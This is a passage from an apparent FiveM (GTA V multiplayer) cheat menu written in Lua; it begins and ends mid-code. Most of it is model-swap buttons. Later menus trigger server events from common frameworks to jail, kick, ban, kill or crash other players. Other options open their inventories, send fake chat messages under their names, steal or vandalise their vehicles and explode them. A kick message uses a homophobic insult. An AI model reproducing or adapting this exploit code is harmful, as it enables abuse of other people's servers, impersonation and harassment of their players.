                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 07') then
              local model = "A_F_Y_SouCent_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 08') then
              local model = "CSB_Anita"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Skater Female') then
              local model = "A_F_Y_Skater_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Old Man') then
              local model = "U_M_O_TapHillBilly"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 01') then
              local model = "S_M_Y_Barman_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 02') then
              local model = "A_M_Y_BreakDance_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 03') then
              local model = "U_M_Y_Chip"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 04') then
              local model = "U_M_Y_GunVend_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 05') then
              local model = "CSB_Groom"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Guy 06') then
              local model = "A_M_Y_Business_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Chinese M 01') then
              local model = "G_M_M_ChiBoss_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Chinese M 02') then
              local model = "G_M_M_ChiGoon_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Chinese M 03') then
              local model = "G_M_M_ChiGoon_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Chinese M 04') then
              local model = "CSB_Hao"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Chinese F') then
              local model = "A_F_Y_Vinewood_03"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean M 01') then
              local model = "A_M_Y_KTown_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean M 02') then
              local model = "A_M_Y_KTown_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean M 03') then
              local model = "G_M_M_KorBoss_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean M 04') then
              local model = "G_M_Y_Korean_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean M 05') then
              local model = "G_M_Y_Korean_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean F 01') then
              local model = "S_F_Y_MovPrem_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean F 02') then
              local model = "A_F_M_KTown_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean F 03') then
              local model = "A_F_M_KTown_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Korean F 04') then
              local model = "A_F_O_KTown_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 01') then
              local model = "A_M_M_MexCntry_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 02') then
              local model = "A_M_M_MexLabor_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 03') then
              local model = "A_M_Y_MexThug_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 04') then
              local model = "G_M_M_MexBoss_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 05') then
              local model = "G_M_M_MexBoss_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 06') then
              local model = "U_M_Y_Mani"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican M 07') then
              local model = "S_M_M_Mariachi_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican F') then
              local model = "U_F_Y_SpyActress"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mexican HMaid F') then
              local model = "S_F_M_Maid_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Boar') then
              local model = "A_C_Boar"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Pig') then
              local model = "A_C_Pig"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Deer') then
              local model = "A_C_Deer"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Chicken') then
              local model = "A_C_Hen"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Hawk') then
              local model = "A_C_Chickenhawk"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Crow') then
              local model = "A_C_Crow"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Monkey') then
              local model = "A_C_Chimp"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Dog Chop') then
              local model = "A_C_Chop"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Dog Husky') then
              local model = "A_C_Husky"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Dog Rottweiler') then
              local model = "A_C_Rottweiler"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Dog Shepherd') then
              local model = "A_C_shepherd"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Lion') then
              local model = "A_C_MtLion"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Rat') then
              local model = "A_C_Rat"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Shark') then
              local model = "A_C_SharkTiger"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model Animal~s~ Coyote') then
              local model = "A_C_Coyote"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Alien') then
              local model = "s_m_m_movalien_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Pongo') then
              local model = "u_m_y_pogo_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Bartender F') then
              local model = "S_F_Y_Bartender_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ FiveM') then
              local model = "mp_m_freemode_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))


              else notify("~r~Model not recognized")
              end
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(sMX) then -- self menu
            if EVP.MenuButton('~p~#~s~ Appearance', CHAR) then
            elseif EVP.CheckBox("Godmode", Godmode, function(enabled) Godmode = enabled end) then
            elseif EVP.CheckBox("~g~Demi~s~-Godmode", Demimode, function(enabled) Demimode = enabled end) then
            elseif EVP.Button("~y~Ball~s~-Godmode") then
              local a="stt_prop_stunt_soccer_ball"while not HasModelLoaded(GetHashKey(a))do Citizen.Wait(0)RequestModel(GetHashKey(a))end;local b=CreateObject(GetHashKey(a),0,0,0,true,true,false)SetEntityVisible(b,0,0)AttachEntityToEntity(b,GetPlayerPed(-1),GetPedBoneIndex(GetPlayerPed(-1),57005),0,0,-1.0,0,0,0,false,true,true,true,1,true)
            elseif EVP.CheckBox("~g~Player Visible", invisible, function(enabled) invisible = enabled end) then
            elseif EVP.Button("~r~Suicide") then
              SetEntityHealth(PlayerPedId(-1), 0)
            elseif EVP.Button("~g~ESX~s~ Revive Yourself~s~ ") then
              TriggerEvent("esx_ambulancejob:revive")
            elseif EVP.Button("~g~Heal/Revive") then
              SetEntityHealth(PlayerPedId(-1), 200)
              TriggerEvent('mythic_hospital:client:RemoveBleed')
              TriggerEvent('mythic_hospital:client:ResetLimbs')
              TriggerEvent('mythic_hospital:client:RemoveBleed')
              TriggerEvent('mythic_hospital:client:ResetLimbs')
            elseif EVP.Button("~b~Give Armour") then
              SetPedArmour(PlayerPedId(-1), 100)
            elseif EVP.CheckBox("Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end) then
            elseif EVP.CheckBox("No Hunger/Thirst/Stress",NoHunThir,function(enabled)NoHunThir = enabled end) then
            elseif EVP.CheckBox("Explosive Punch",ePunch,function(enabled)ePunch = enabled end) then
            elseif EVP.CheckBox("Anti Ragdoll", antirag,function(enabled)antirag = enabled end) then
            elseif EVP.CheckBox("~b~Aquaman", aquaman,function(enabled)aquaman = enabled end) then
            elseif EVP.CheckBox("Thermal ~o~Vision", bTherm, function(bTherm) end) then
              therm = not therm
              bTherm = therm
              SetSeethrough(therm)
            elseif EVP.CheckBox("Night ~o~Vision", bnVision, function(bnVision) end) then
              nVision = not nVision
              bnVision = nVision
              SetNightvision(nVision)
            elseif EVP.CheckBox("Become Tiny", tinyman,function(enabled)tinyman = enabled end) then
            elseif EVP.CheckBox("Become Flash", bcFlash,function(enabled)bcFlash = enabled end) then
            elseif EVP.CheckBox("Fast Run",fastrun,function(enabled)fastrun = enabled end) then
            elseif EVP.CheckBox("Super Jump", SuperJump, function(enabled) SuperJump = enabled end) then
            elseif EVP.CheckBox("Noclip",Noclip,function(enabled)Noclip = enabled end) then
            end

            EVP.Display()
          elseif EVP.IsMenuOpened(OPMS) then 
            if EVP.MenuButton("~p~#~s~ All Players", GAPA) then
            else
              local playerlist = GetActivePlayers()
              for i = 1, #playerlist do
                local currPlayer = playerlist[i]
                if EVP.MenuButton("ID: ~y~["..GetPlayerServerId(currPlayer).."] ~s~"..GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~DEAD" or "~g~ALIVE"), 'PlayerOptionsMenu') then
                  SelectedPlayer = currPlayer
                end
              end
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(poms) then -- select player options
            drawDescription("Main selected player options", 0.80, 0.9)
            EVP.SetSubTitle(poms, "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
            if EVP.MenuButton("~p~#~s~ Troll Menu", Tmas) then
            elseif EVP.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
              SpectatePlayer(SelectedPlayer)
            elseif EVP.Button("~r~Spectate w/ voice", (Spectating2 and "~g~[SPECTATING]")) then
              SpectatePlayer2(SelectedPlayer)
            elseif EVP.CheckBox("Track Player", Tracking, function(enabled) end) then
              Tracking = not Tracking
              TrackedPlayer = SelectedPlayer
            elseif EVP.Button("~r~Ball GODMODE ~s~Player") then
              local hashball = "stt_prop_stunt_soccer_ball"
              while not HasModelLoaded(GetHashKey(hashball)) do
                Citizen.Wait(0)
                RequestModel(GetHashKey(hashball))
              end
              local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
              SetEntityVisible(ball, 0, 0)
              AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)

            elseif EVP.Button("~g~ESX ~s~Revive ~r~(RISK)") then
              TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
              TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
              TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
              TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
              TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
              TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
              StopScreenEffect('DeathFailOut')
              DoScreenFadeIn(800)
              notify("~r~Done")
            elseif EVP.Button('~b~VRP ~s~Revive') then
              local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
              CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
              SetPickupRegenerationTime(pickup, 60)
            elseif EVP.Button("~g~Heal ~s~Player") then
              local medkitname = "PICKUP_HEALTH_STANDARD"
              local medkit = GetHashKey(medkitname)
              local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
              CreateAmbientPickup(medkit, coords.x, coords.y, coords.z + 1.0, 1, 1, medkit, 1, 0)
              SetPickupRegenerationTime(pickup, 60)
            elseif EVP.Button("Teleport To") then
              local confirm = KeyboardInput("Are you sure? y/n", "", 0)
              if confirm == "y" then
                local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                if confirm == "n" then
                  notify("~b~Operation cancelled~s~.", false)
                else
                  notify("~b~Invalid Confirmation~s~.", true)
                  notify("~b~Operation cancelled~s~.", false)
                end
              else
                local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
              end

            elseif EVP.Button("Teleport into Vehicle") then
              local confirm = KeyboardInput("Are you sure? y/n", "", 0)
              if confirm == "y" then
                TeleportToPlayerVehicle(SelectedPlayer)
                if confirm == "n" then
                  notify("~b~Operation cancelled~s~.", false)
                else
                  notify("~b~Invalid Confirmation~s~.", true)
                  notify("~b~Operation cancelled~s~.", false)
                end
              else
                local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
              end
            elseif EVP.Button("~r~Open Player's Inv") then
              EVP.TriggerCustomEvent(false, "esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
            elseif EVP.MenuButton("~p~#~s~ Give Single Weapon", GSWP) then
            elseif EVP.Button('Remove ~r~All Weapons' ) then
              RemoveAllPedWeapons(SelectedPlayer, true)
            elseif EVP.Button("Give ~r~All Weapons") then
              for i = 1, #allWeapons do
                GiveWeaponToPed(SelectedPlayer, GetHashKey(allWeapons[i]), 1000, false, false)
              end

            elseif EVP.Button("Give ~r~Vehicle") then
              local ped = GetPlayerPed(SelectedPlayer)
              local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
              if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                RequestModel(ModelName)
                while not HasModelLoaded(ModelName) do
                  Citizen.Wait(0)
                end
                local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped)+90, true, true)
              else
                notify("~b~Model is not valid!", true)
              end
            elseif EVP.Button("Give ~r~Owned ~b~Vehicle") then
              local ped = GetPlayerPed(SelectedPlayer)
              local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
              local newPlate =  KeyboardInput("Enter Vehicle License Plate", "", 100)

              if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                RequestModel(ModelName)
                while not HasModelLoaded(ModelName) do
                  Citizen.Wait(0)
                end

                local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                SetVehicleNumberPlateText(veh, newPlate)
                local vehicleProps = ESX.Game.GetVehicleProperties(veh)
                --TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
                TriggerServerEvent('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
                notify("Success")
              else
                notify("~r~Model is not valid!")
              end
            elseif EVP.Button("Steal ~r~Vehicle") then
              local ped = GetPlayerPed(SelectedPlayer)
              local vehicle = GetVehiclePedIsUsing(ped)
              local StealVehicleThread = StealVehicle(vehicle)
              CreateThreadNow(StealVehicleThread)

            elseif EVP.Button("Repair ~r~Vehicle") then
              local ped = GetPlayerPed(SelectedPlayer)
              local vehicle = GetVehiclePedIsUsing(ped)
              RepairVehicle(vehicle)
            elseif EVP.Button('Refuel ~r~Vehicle') then
              refuelcar(SelectedPlayer)
            elseif EVP.Button("Vandalize Car") then
              local playerPed = GetPlayerPed(SelectedPlayer)
              local playerVeh = GetVehiclePedIsIn(playerPed, true)
              local vehNet = VehToNet(playerVeh)
              NetworkRequestControlOfNetworkId(vehNet)
              playerVeh = NetToVeh(vehNet)
              NetworkRequestControlOfEntity(playerVeh)
              StartVehicleAlarm(playerVeh)
              DetachVehicleWindscreen(playerVeh)
              SmashVehicleWindow(playerVeh, 0)
              SmashVehicleWindow(playerVeh, 1)
              SmashVehicleWindow(playerVeh, 2)
              SmashVehicleWindow(playerVeh, 3)
              SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
              SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
              SetVehicleDoorBroken(playerVeh, 0, true)
              SetVehicleDoorBroken(playerVeh, 1, true)
              SetVehicleDoorBroken(playerVeh, 2, true)
              SetVehicleDoorBroken(playerVeh, 3, true)
              SetVehicleDoorBroken(playerVeh, 4, true)
              SetVehicleDoorBroken(playerVeh, 5, true)
              SetVehicleDoorBroken(playerVeh, 6, true)
              SetVehicleDoorBroken(playerVeh, 7, true)
              SetVehicleLights(playerVeh, 1)
              Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
              SetVehicleNumberPlateTextIndex(playerVeh, 5)
              SetVehicleDirtLevel(playerVeh, 10.0)
              SetVehicleModColor_1(playerVeh, 1)
              SetVehicleModColor_2(playerVeh, 1)
              SetVehicleBurnout(playerVeh, true)
              notify("~g~Vehicle Fucked Up!")
            elseif EVP.Button("Launch Players Vehicle") then
              if not IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), 0) then
                notify("~r~Player Not In Vehicle!")		
              else
              
                local wasSpeccing= false
                local tmp = nil
                if Spectating then
                  tmp = SpectatedPlayer
                  wasSpeccing = true
                  Spectating = not Spectating
                  SpectatePlayer(tmp)
                end
                
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                RequestControlOnce(veh)
                ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                
                if wasSpeccing then
                  Spectating = not Spectating
                  SpectatePlayer(tmp)
                end
                
              end
            elseif EVP.Button("Slam Player Vehicle") then
              if not IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), 0) then
                notify("~r~Player Not In Vehicle!")
              else
              
                local wasSpeccing= false
                local tmp = nil
                if Spectating then
                  tmp = SpectatedPlayer
                  wasSpeccing = true
                  Spectating = not Spectating
                  SpectatePlayer(tmp)
                end
                
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                RequestControlOnce(veh)
                ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                
                if wasSpeccing then
                  Spectating = not Spectating
                  SpectatePlayer(tmp)
                end
                
              end
            elseif EVP.Button("Send To ~r~Jail") then
              TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(SelectedPlayer), 5000, "Jailed")
              TSE("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
              TSE("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
              TSE("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "Jailed")
            elseif EVP.Button("~r~Admin Player ~s~KILL") then
              TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
            elseif EVP.Button("~r~Admin Player ~s~BAN") then
              TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
            elseif EVP.Button("~r~Admin Player ~s~KICK") then
              TriggerServerEvent('mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: GAY!." )
              TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "Kicked: GAY!." )
            elseif EVP.Button("~r~Admin Player ~s~BAN2") then
              TriggerServerEvent("EasyAdmin:banPlayer", GetPlayerServerId( SelectedPlayer ), BanReason, banLength[BanTime].time, GetPlayerName( thePlayer ))
            elseif EVP.Button("~r~Admin Player ~s~CRASH") then
              TriggerClientEvent('es_admin:crash', PlayerPedId(SelectedPlayer))
            end
            EVP.Display()
          elseif EVP.IsMenuOpened(Tmas) then -- player troll
            drawDescription("~r~Troll ~s~features for player", 0.80, 0.9)
            if EVP.MenuButton("~p~#~s~ Spawn Peds", SPD) then
            elseif EVP.Button("Nearby Peds Attack Player") then
              PedAttack(SelectedPlayer, PedAttackType)
            elseif EVP.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
              currAttackTypeIndex = currentIndex
              selAttackTypeIndex = currentIndex
              PedAttackType = currentIndex
            end) then 
            elseif EVP.Button("Possess Player Vehicle") then
              if Spectating then SpectatePlayer(SelectedPlayer) end
              PossessVehicle(SelectedPlayer)
            elseif EVP.Button("Clone Skin") then
              ClonePedlol(SelectedPlayer)
            elseif EVP.Button('Clone ~r~Car') then
              ClonePedVeh()
            elseif EVP.Button("~r~Fake ~s~Chat Message") then
              local messaggio = KeyboardInput("Enter message to send", "", 100)
              local cazzo = GetPlayerName(SelectedPlayer)
              if messaggio then
                TSE("_chat:messageEntered", cazzo, { 0, 0x99, 255 }, messaggio)
              end
            elseif EVP.Button("Cancel Animation/Task") then
              ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            elseif EVP.Button("~r~Airstrike ~s~Player") then
              AirstrikePlayer(SelectedPlayer)
            elseif EVP.Button("~r~Taze ~s~Player") then
              TazePlayer(SelectedPlayer)
            elseif EVP.Button("~r~Ignite ~s~Player") then
              IgnitePlayer(SelectedPlayer)
            elseif EVP.CheckBox("Fling Player", FlingingPlayer, function(enabled) end) then
              FlingingPlayer = not FlingingPlayer
              FlingedPlayer = SelectedPlayer
            elseif EVP.Button("Silent Kill Player") then 
              local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
              AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
            elseif EVP.Button("~r~Kick ~s~From Vehicle") then
              ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            elseif EVP.Button("~y~Explode ~s~Vehicle") then
